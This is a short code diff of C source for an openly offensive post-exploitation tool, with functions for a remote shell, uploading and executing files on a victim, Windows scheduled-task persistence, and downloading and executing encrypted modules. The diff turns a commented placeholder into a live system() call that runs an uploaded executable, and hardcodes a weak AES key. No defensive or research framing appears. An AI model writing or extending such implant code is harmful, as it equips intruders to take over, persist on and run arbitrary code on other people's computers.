@@ -77,8 +77,10 @@ void remote_shell() {
 void file_transfer_execute() {
     // Example: upload a file to victim or execute one (file handling omitted)
     printf("Uploading and executing file...\n");
-    // You can use DNS tunneling or another method to send files securely
-    // system("upload command here");
+
+    // Example of file execution after uploading (adjust path accordingly)
+    // Replace "path/to/uploaded/file.exe" with the actual uploaded file path
+    system("path/to/uploaded/file.exe");  
 }
 
 // Persistence Mechanism (Windows): Create scheduled task for persistence
@@ -125,7 +127,7 @@ void download_and_execute_module(const unsigned char *encryption_key) {
 // Main function: User input for different post-exploitation tasks
 int main() {
     int choice;
-    const unsigned char *encryption_key = "your-encryption-key";  // AES key for decryption
+    const unsigned char *encryption_key = "123456789";  // AES key for decryption
 
     printf("Choose an action:\n");
     printf("1. Remote Shell\n");
